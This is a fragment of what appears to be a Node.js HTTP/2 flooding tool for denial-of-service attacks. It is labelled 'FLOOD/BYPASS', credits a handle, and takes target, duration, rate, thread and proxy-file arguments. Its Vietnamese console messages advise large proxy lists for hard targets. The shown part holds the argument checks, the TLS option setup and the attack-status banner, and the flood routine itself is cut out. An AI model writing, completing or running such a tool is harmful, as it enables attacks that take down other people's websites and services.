...
crypto.constants.SSL_OP_NO_SESSION_RESUMPTION_ON_RENEGOTIATION;
 if (process.argv.length < 7){console.log('Target Time Rate Thread Proxy FLOOD/BYPASS @NeganSSHConsole'.rainbow); process.exit();}
...
colors.enable();
const coloredString = "Khuyến nghị sử dụng proxyfile lớn nếu mục tiêu khó.\n >  Chỉ hỗ trợ HTTP/2.\n > Sử dụng luồng thấp nếu bạn không muốn làm sập máy chủ của mình.".white;
if (cluster.isMaster) {
    console.clear()
    console.log(`[!] FLOOD/BYPASS`.red);
    console.log(`--------------------------------------------`.gray);
    console.log("[>] Memory:".rainbow, (v8.getHeapStatistics().heap_size_limit / (1024 * 1024)).toString().yellow);
    console.log('[>] Mục tiêu: '.rainbow + process.argv[2].cyan);
    console.log('[>] Thời gian: '.rainbow + process.argv[3].cyan);
    console.log('[>] Tốc độ: '.rainbow + process.argv[4].cyan);
    console.log('[>] Số luồng: '.rainbow + process.argv[5].cyan);
    console.log(`[>] ProxyFile: ${args.proxyFile.cyan} | Tổng cộng: ${proxies.length.toString().cyan}`);
    console.log('[>] Chế độ: '.rainbow + process.argv[7].cyan);
    console.log("[>] Lưu ý: ".rainbow + coloredString);    
    console.log(`--------------------------------------------`.gray);
